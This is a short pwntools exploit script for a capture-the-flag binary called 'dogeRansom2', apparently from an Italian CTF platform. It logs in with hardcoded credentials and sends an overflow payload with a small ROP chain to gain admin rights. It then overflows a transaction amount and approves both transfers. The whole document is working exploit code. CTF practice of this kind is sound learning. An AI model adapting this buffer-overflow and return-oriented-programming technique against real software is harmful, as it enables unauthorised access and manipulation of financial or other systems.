from pwnlib.context import context
from pwnlib import flag
from pwn import *


elf = ELF('./dogeRansom2')
if args.REMOTE:
    r = remote("dogeransom2.challs.olicyber.it", 10806)
else:
    r = process('./dogeRansom2')


username = b'Dr. Bez Casamiei'
password = b'Team-fortezza-10'
IBAN = b'IT70S0501811800000012284030'


r.sendlineafter(b'Username: ', username)
r.sendlineafter(b'Password: ', password)

payload = IBAN + b'\x00'*(64-len(IBAN)) + flat([
    p64(0x40224b),    # pop rdi; ret
    p64(0x406240),    # admin id
    p64(elf.sym['mainMenu'])
])

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'inviare: ', b'7')
r.sendlineafter(b'dogemoney: ', IBAN)
r.sendlineafter(b'iban: ', payload)


# Now we have logged in as admin
payload = IBAN + b'\x00'*(36-len(IBAN)) + p32(8) + b'\xFF'*8

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'inviare: ', b'8')
r.sendlineafter(b'dogemoney: ', payload)
r.sendlineafter(b'iban: ', IBAN)


# Approve both transactions
r.sendlineafter(b'> ', b'6')
r.sendlineafter(b'> ', b'Y')

r.sendlineafter(b'> ', b'6')
r.sendlineafter(b'> ', b'Y')

print(r.recvall(timeout=5).decode())
r.interactive()